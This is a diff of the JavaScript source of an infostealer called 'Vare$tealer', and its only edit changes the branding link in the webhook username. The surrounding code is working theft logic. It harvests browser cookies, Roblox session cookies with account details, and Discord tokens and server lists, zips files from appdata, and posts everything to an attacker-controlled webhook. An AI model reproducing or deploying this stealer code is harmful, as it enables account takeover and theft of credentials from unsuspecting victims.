@@ -207,7 +207,7 @@ async function %VAREINSTA%(cookie) {
   let embed=await %GETEMBED%(),data = await %INSTADATA%(cookie);
   const lllllllll=new FormData;
   lllllllll.append("payload_json",JSON.stringify({
-    username:"Vare$tealer - https://github.com/saintdaddy",
+    username:"Vare$tealer - https://discord.com/hgtAYDGgT6",
     avatar_url:embed.avatar,
     embeds: [
       {
@@ -309,7 +309,7 @@ async function %SENDLOGS%() {
      lllllllll.append('file', fs.createReadStream( appdata + `\\${cr}_${os.hostname}${random}${random}.zip`));
     llllllll.append('payload_json', JSON.stringify({
         "content": `**Cookie Keywords** : ${all_founds}`,
-        "username": "Vare$tealer - https://github.com/saintdaddy",
+        "username": "Vare$tealer - https://discord.com/hgtAYDGgT6",
         "avatar_url": embed.avatar,
         "embeds": [
           {
@@ -443,7 +443,7 @@ async function %VARECOOKIES%(path) {
 async function %SENDROBLOX%(secret_cookie) {
       let embed=await %GETEMBED%(),data=await %GETROBLOX%(secret_cookie);
       const lllllll=new FormData;
-      lllllll.append("payload_json",JSON.stringify({username:"Vare$tealer - https://github.com/saintdaddy",avatar_url:embed.avatar,embeds:[{color:3092790,fields:[{name:"Username",value:`\`${data.username}\``,inline:!0},{name:"Robux",value:`\`${data.robux}\``,inline:!0},{name:"Premium",value:`\`${data.premium?"✅":"❌"}\``,inline:!0},{name:"Cookie",value:`\`\`\`${secret_cookie}\`\`\``}],author:{name:`${data.username} | ${data.id}`,icon_url:data.avatar},footer:{text:`Vare$tealer - ${embed.url} - ${os.hostname}`,icon_url:embed.footericon}}]}));
+      lllllll.append("payload_json",JSON.stringify({username:"Vare$tealer - https://discord.com/hgtAYDGgT6",avatar_url:embed.avatar,embeds:[{color:3092790,fields:[{name:"Username",value:`\`${data.username}\``,inline:!0},{name:"Robux",value:`\`${data.robux}\``,inline:!0},{name:"Premium",value:`\`${data.premium?"✅":"❌"}\``,inline:!0},{name:"Cookie",value:`\`\`\`${secret_cookie}\`\`\``}],author:{name:`${data.username} | ${data.id}`,icon_url:data.avatar},footer:{text:`Vare$tealer - ${embed.url} - ${os.hostname}`,icon_url:embed.footericon}}]}));
       axios.post(%webhookstring%,lllllll,{headers:{...lllllll.getHeaders()}});
 }
 
@@ -817,7 +817,7 @@ async function %VARESTEALTOKEN%() {
         var pp = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
         var servers = await %VARESERVERS%(token)
         axios.post(%webhookstring%, {
-            username: "Vare$tealer - https://github.com/saintdaddy",
+            username: "Vare$tealer - https://discord.com/hgtAYDGgT6",
             avatar_url: embed.avatar,
             embeds: [{
                 "color": 3092790,
